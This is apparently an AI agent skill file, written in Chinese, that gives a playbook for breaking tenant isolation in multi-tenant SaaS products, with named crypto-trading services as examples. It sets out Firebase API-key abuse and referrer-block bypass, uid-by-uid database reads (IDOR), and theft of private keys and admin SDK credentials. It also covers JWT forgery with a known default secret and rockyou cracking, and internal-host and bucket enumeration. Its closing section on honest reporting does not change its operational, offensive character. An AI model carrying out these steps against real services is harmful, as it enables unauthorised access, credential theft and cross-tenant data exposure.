---
name: 租云·契
description: "多租户SaaS全链渗透：ACL差分扫描、临时邮箱注册绕过、BOLA/IDOR矩阵、Firebase平台直攻、WS频道隔离、密钥库明文、基础设施侦察。触发：租户越权、SaaS打穿、project/tenant隔离、api_key/secret_key泄露、Firebase后端、加密交易机器人。"
version: 1.0.0
license: MIT
...
## 6b. Firebase 后端平台（altfins/goodcrypto 类）

```bash
# 1. 提取 apiKey（bundle 或 firebase_cfg.json）
POST https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={apiKey}
Body: {"email":"...","password":"...","returnSecureToken":true}
# 403 API_KEY_HTTP_REFERRER_BLOCKED → 加 Referer/Origin 头; API_KEY_SERVICE_BLOCKED → 换 Web3Auth/OAuth
GET https://<projectId>-default-rtdb.firebaseio.com/{path}.json?auth={idToken}
# token 约 25h 过期 → POST /v1/token?key={apiKey} grant_type=refresh_token 刷新
```
- RTDB IDOR：`/users/{uid}.json` 逐 uid 读；Firestore：`/v1/projects/{id}/databases/(default)/documents/{col}/{doc}?key={apiKey}`
- 高价值：从 RTDB/Firestore 读回 RSA 密钥对/API key；找 `firebase-adminsdk-*` 私钥 → 全库读写

## 6c. 密钥端点与基础设施侦察

- 找 `accounts`/`keys`/`wallets` 类端点，schema 是否含 `api_key`/`secret_key`/`passphrase`/`privateKey` **明文**
- 创建账号报错泄露代理 IP（如 `"proxy_ip":"10.4.2.96:8089"`）→ 记入内网情报、nmap top200
- JWT：`alg:none` → FastAPI 默认密钥 `09d25e094faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7` → rockyou；**弱密钥命中 → 伪造任意用户 token → 绕全部租户 ACL**
- 主机命名枚举：`rb-{0..3}-ip{0..9}.<domain>`、`db./pg./redis./k8s.` 全；S3/CDN 子域 ListBucket
- sourcegraph stream：`/.api/search/stream?q=context:global+"api.x.com"`

## 7. 收尾

- 半程利用 ≠ 打穿：跨租户**写** preset 但没读回通道 = 报告 BOLA write，不吹打穿
- 诚实汇报：每条攻击路径的实测结果（200/404/429/denied）列表；用户库/枚举数据落 JSON
- 证据：openapi.json + 会话凭证 + 差分扫描结果 + BOLA 复现请求落地 `evidence/` 目录

详见 `references/multitenant-acl-playbook.md（origami.tech 实战完整配方：差分脚本、WS 帧、mail.tm 流程、JWT 顺序、限流实测`。

## 真源

- 手法：`传承/万我.md`
- 工具：`python3 炼蛊房/object_matrix.py --help`
